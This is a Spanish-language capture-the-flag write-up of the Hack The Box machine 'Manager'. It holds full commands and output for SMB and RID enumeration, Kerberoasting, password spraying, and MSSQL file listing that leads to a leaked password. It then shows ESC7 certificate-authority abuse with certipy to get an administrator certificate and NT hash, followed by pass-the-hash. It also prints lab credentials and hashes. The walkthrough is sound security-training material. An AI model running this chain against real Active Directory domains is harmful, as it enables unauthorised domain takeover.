---
tags:
title: Manager- Medium (HTB)
permalink: /Manager-HTB-Writeup
toc_label: Topics
toc: true
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49685,49686,49691,49721,49731 10.129.237.117
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 13:44 -0500
Nmap scan report for 10.129.237.117
Host is up (0.90s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-03 01:47:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-01-03T01:49:29+00:00; +7h02m37s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-03T01:49:28+00:00; +7h02m38s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.237.117:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.237.117:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-03T01:45:07
|_Not valid after:  2056-01-03T01:45:07
|_ssl-date: 2026-01-03T01:49:29+00:00; +7h02m37s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-01-03T01:49:30+00:00; +7h02m38s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-01-03T01:49:28+00:00; +7h02m38s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
49731/tcp open  unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-03T01:48:48
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h02m36s, deviation: 0s, median: 7h02m36s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.52 seconds

```

## Website

La pagina principal es estática 
![image-center](/assets/images/Pasted image 20260102154657.png)

## SMB

Como el usuario `guest` esta habilitado enumere `shares`.

```bash     
nxc smb manager.htb -u 'guest' -p '' --shares
SMB         10.129.237.117  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) 
SMB         10.129.237.117  445    DC01             [+] manager.htb\guest: 
SMB         10.129.237.117  445    DC01             [*] Enumerated shares
SMB         10.129.237.117  445    DC01             Share           Permissions     Remark
SMB         10.129.237.117  445    DC01             -----           -----------     ------
SMB         10.129.237.117  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.237.117  445    DC01             C$                              Default share
SMB         10.129.237.117  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.237.117  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.237.117  445    DC01             SYSVOL                          Logon server share 
```
### Valid users

Nada interesante en ellos, así que con el parámetro `--rid-brute` enumere usuarios validos del dominio.

```bash
nxc smb manager.htb -u 'guest' -p '' --rid-brute
SMB         10.129.237.117  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) 
SMB         10.129.237.117  445    DC01             [+] manager.htb\guest: 
SMB         10.129.237.117  445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.237.117  445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.129.237.117  445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.129.237.117  445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.129.237.117  445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.129.237.117  445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.129.237.117  445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.129.237.117  445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.129.237.117  445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.129.237.117  445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.129.237.117  445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.129.237.117  445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.129.237.117  445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.237.117  445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.237.117  445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.237.117  445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.129.237.117  445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.129.237.117  445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.237.117  445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.237.117  445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.237.117  445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.237.117  445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.129.237.117  445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.129.237.117  445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.237.117  445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.129.237.117  445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.129.237.117  445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.237.117  445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.237.117  445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.237.117  445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.237.117  445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.237.117  445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

Con este output, ejecute el siguiente comando para solo agregar al archivo `users` los usuarios.

```bash
cat users| grep "TypeUser" | awk '{print $6}' | tr '\\' " "  | awk '{print $NF}' | sponge users 
```
### Kerberoasting fail

Al realizar un `Kerberoasting attack` no vi nada de nada, solo algunos tickets TGS pero son incrackeables ya que pertenecen al usuario maquina `(DC01$)` y a `krbtgt` los cuales son usuarios que por defecto tienen passwords muy seguras y largas.
```bash
impacket-GetUserSPNs manager.htb/guest -request -usersfile users -dc-ip 10.129.237.117 -no-pass
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$MANAGER.HTB$*krbtgt*$d381d634c0977d002675d788$89b9f6dc5f802d211963b52376078d9c195b4174932bd3c0bc333cebb7754af72002cff6d39e7c45cc74ef10e50268099b9bfc97c20db1cd6566059889ad2da9511cb7a8146381cbe4ac174b0c934901eadbeda236f5b7b55459ce1a874d9c358804310820b8cc406672d13fe0274b703c8dfcbfa1fa5168f953947668a858c9501be211401df8856834f4f98876084542370ed4559c71331e0b934118270f67566f51c94d89fe0379df624fa57325f099068730eaf1654db61f6fa074a599406db8d542bcc21de5c158c5f9959f7c6d3891c5971995a08e067e229f99cf925555eefd652d44456525719aa75bbf61b5eee4d37599f59e45bd04aed582171cd957c49196308b22a5cb2e0080b7513a8496817d6798d85058d7eff103d88bdf8051d8ea5e1f2d1e707e6ac2f0cc1ef8ed0369743c387463f6c70040f1774565c72a1a0fe23549b1a8a22920e9d812309299021368c7761e733ac27fbdcce3de15ff126348636be87e0a4dbc7b4127b1a9441380fab74bce803542fc39e44e5388b593c2fc366ebbcbd07a5cd8e58bde72cd42f3bacc4d49461c576d03faceb48280962f8a1b5167264f79d4a0a74a7ba760f072cfc671521f71fd26a1d331d9e9b71e67dc76e4f1b4d497939045bf0cff25ef8942ba121a29208873162729c55d13ec185740558f1e6e753eb1a995ab32fb3916d446962142d55b9239cbea91e8dc248373575c07277c09731ad7443a7d79b5ba7b46c109249b43bb37cc753070dd9046ac199c32abcb481f3260f174a625891a72be26f9da12de6e8ea5706b47a763f1deb604a9215c18b2ee1abb54282e7afda1be1e2179043e1a13f891feefd4a1b48b7370c0b8f5ccdd83e1dd7ede81f0b9dbc9ea72562d4a0765b5d48fc37f4cdb7f425f0ba1aaea7c2424633a8cef68826a9cf5088a441f506a02337936abf193c117dfd52b0de1fd56e994aba6659384bfef7fbb5004d6e515fb496844c78f3a22a993c316c7ad18aa0888c76ef83a6802b295d0b1fd552fc90847f8ef79e1953ef288df109b131f5ab9e335afc715b5afb03cbcfb4f49fa4eb68fb2f0c0eb900b80b5693cf8fc390158732a7d57f022136274c767f7852e7e0852c58f83b742dd766eef855ab32854197db3c705c08ade3e360c5e631fa972b37be852721b2a9c20834134bcda481068afc4442674784a8279675f6f3e5c7d61b27eefedc11dd6fd3a6e854950bfc66f34b7dfaff71d23dfd82b871a3d2548ef74a6807dc2f44254a4756905f416d2b445c7aaa930af3dfd4625519cdfd10c4fba5c3fd61befa487b4924a10c722de282ae889263cd96ddae6ed7ef95490a4e05adba9f0cba5f8d0298a88a877e9c6821ba87a7252d1b8dcf0dddafd65075eb372d7b70ea307b5beae221b5566e48e1d0b6adadcacccaf999797f7abc338d1c542231b70
$krb5tgs$18$DC01$$MANAGER.HTB$*DC01$*$eee64c584988592b008fb830$09c6ba93d00264528e9602c1ef9dc8725b32393e8b8be70b52758779f08c5b36f77fac649ab17fd1ef04f375d2fe59b27af4ecb430155368e31aa039bb76218417c14ca92117d7d932931b9e25c8bac32b955bc326abd40601f69a244372b3ace86c01f0fcd51cfc1539171c1d30ab3af4075f39c647670a9d42c86692a2c241e073039618a382d9e733d4a539efa160bf329ebcb183685b943536f200dfa68d09b8853765faff709ec51293176188afd5c3f65810dc952f1e0eb0618b02d74f398d3b466c28b167130f4064f6d39b584300c1e5fafa9f9d15837beea0e3e18b297ceb21049d08b53704887f84cb0061bc6ffc175d85293deae371ae9c6a622d8a92aa819c8023086cae67fbbee3944809664a9b6c5150641ee2a8e79d22bc29895bd3d9700ed2932bbe391ce54c6de2c576cb7ce45c893f1b2dfada460c39ecb293156003e5bf4c69b9e40e7e4fc17dc02645a24345cc918f4c006f6789275455fef4b4e888049fd8e92e577facb14d80a1deb63f1436e4923d34b99e3c96963fcf4f6b9e8523843aa882407713391537e2abcdb0a93c95d0fd555e75611670bf15b038911d6628802fc68686dfd8b29551892d8246ba323f11de4036b584498b17b16e95ac7748d4f922206d8c022b3fbcb8fdb4715b3234d31e7d0f7b309c267e35b3d6487b9f8e88af32dbf5976aa3c3fe5a8101f345f56e21c48fbf4445787762a8fa37ebbeb7d15f0f337c0cef231cf4e60509292fd73a3563b32bd7a0c69fb088f1eab48e7ccb91a3a42c445f46008e3a667b242819bbca727880c8a1e1dfe48a6939f98237318dd0657197abf7ec3e570582848e19bbed3ce5aeba00ce7117c19d006e4e2fe872c64da8b01b3a2f61ea26c72d2ebc3bbc781a4628ba43dba987dd8bfa02b8bfe6568874d0b0909b771df38255e88bad4be1c88197cf7c1edd2868271108834f89a2aa11947193bad34a9ee8cf812c4f7adf9d9cb8c64085eb9c2236f26ac312004cc4901454179f45cfdfa3d01e66ea7e8197a66df4f44588a542dfb22a1302a10173e97708491427f45d67a3e15d75e79c75a6c83301edb7521877141db6cb9d2e7022e606630cc85841fe542260069f1e844b0f8e0f549119f8a045ab699e798c92e75aa8a7b5c16df9854e78dbc49fb62719f16b1aa124647c8700a15545c0786567ffa7e2859a754b8dadbf1cd49b7a00b59ad07af2e66745707ae7b62080fdb2c949ec7f429b47d10c761a801e45cea88f601b9d4b8e6e1a6347c0fd0d7b24e9683023dd30bcc54dd2caa4cea7c33ba2c853a511d9c6dcfd94043eacd44b716a8c7ea5aaa002092ce1dcc82bf6f50a27e220b2942d7ea91a2e11544c8dacdef07c65c103cff59052680757f5fd10c7269ef5ef27efd8a35362e523c3b515ba70d39cb72a26649763003dcf35
[-] Principal: Zhong - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Cheng - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Ryan - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Raven - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: JinWoo - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: ChinHae - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Operator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```
### Password spraying

Con las misma lista de usuarios cree una en minuscula de passwords, con los mismos nombres.

```bash
cat users | tr 'A-Z' 'a-z' > passwords
```

Y me dio una coincidencia.

```bash
nxc smb manager.htb -u users -p passwords
SMB         10.129.237.117  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) 
SMB         10.129.237.117  445    DC01             [-] manager.htb\Zhong:zhong STATUS_LOGON_FAILURE 
<SNIP>
SMB         10.129.237.117  445    DC01             [+] manager.htb\Operator:operator 
```
## Shell as raven
### MSSQL as operator

Con las credenciales del usuario `operator` me conecte a la base de datos de Microsoft `(MSSQL)`.

```bash
impacket-mssqlclient manager.htb/Operator:operator@dc01.manager.htb -dc-ip 10.129.237.117 -windows-auth
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)>
```
### Backup file

Con la funcion `xp_dirtree` del propio mssql, pude listar el contenido de los directorios de la maquina, donde en el directorio donde corre la pagina web, encontre un archivo backup.

```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1  
```

Con `wget` me lo descargue.

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip
--2026-01-02 21:32:05--  http://manager.htb/website-backup-27-07-23-old.zip
Resolving manager.htb (manager.htb)... 10.129.237.117
Connecting to manager.htb (manager.htb)|10.129.237.117|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip                100%[====================================================================================================>]   1021K   127KB/s    in 10s     

2026-01-02 21:32:16 (102 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
```

Y con `unzip` lo descomprimí.

```bash
unzip website-backup-27-07-23-old.zip 
Archive:  website-backup-27-07-23-old.zip
  inflating: .old-conf.xml           
  inflating: about.html              
<SNIP>       
```
### Credentials

Y viendo el contenido del archivo oculto, vi las credenciales del usuario `raven`.

```xml
cat .old-conf.xml                     
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>

```
### Auth

Y con `evil-winrm` me conecte a la maquina.

```powershell
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Raven\Documents> type ../desktop/user.txt
ba7809e87a02170bfd7a57c5edaeeae3
```
## Shell as administrator
### ADCS Enumeration

Con las credenciales de este usuario enumere plantillas vulnerables de las cuales pueda abusar.

```bash
certipy find -dc-ip 10.129.237.117 -target dc01.manager.htb -enabled -vulnerable -stdout -u raven -p 'R4v3nBe5tD3veloP3r!123' 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'manager-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'manager-DC01-CA'
[*] Checking web enrollment for CA 'manager-DC01-CA' @ 'dc01.manager.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```
### ESC7 Abuse

Primero agregue un nuevo miembro para poder después, `habilitar`, `aceptar` o `denegar` solicitudes de pendientes de `aprobacion` para los certificados que se `solicitan`.

```BASH
 certipy ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.237.117' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -add-officer 'raven'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

Luego con los permisos de `ManagerCA`, habilito `SubCA`.

```bash
certipy ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.237.117' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -enable-template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'

```
### Get administrator SID

Para el siguiente paso necesito el `SID` del usuario `administrator`.

```POWERSHELL
*Evil-WinRM* PS C:\Users\Raven\Documents> Get-ADUser -Identity administrator | select Name,SID

Name          SID
----          ---
Administrator S-1-5-21-4078382237-1492182817-2568127209-500

```

Después solicito un certificado usando la plantilla `SubCA`, de manera que va a fallar.

```bash
certipy req \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.237.117' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -template 'SubCA' -upn 'administrator@manager.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '19.key'
[*] Wrote private key to '19.key'
[-] Failed to request certificate
```
### Approve the pending request

Luego prestando atención al `ID` de la solicitud, puedo pasar, debido a que tengo los permisos adecuados, `aceptar` la solicitud.

```bash
 certipy ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.237.117' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -issue-request '19'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 19
```

Y ahora que la solicitud la acepte, puedo volver a solicitar el certificado, usando el mismo `ID` con el que aprobé la solicitud.

```bash
certipy req \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -dc-ip '10.129.237.117' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -retrieve '19'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 19
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Loaded private key from '19.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
### NTLM Hash

Usando el mismo, me autentico contra el dominio para poder obtener el hash NT, del usuario `Administrator`.

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.237.117'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*]     Security Extension SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```
### Shell

Y usando el mismo, puedo realizar la conexión con `evil-winrm`.

```powershell
evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef                           
                                        
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
75b577a60a1387f3476230d4a79cf672
```

`~Happy Hacking.`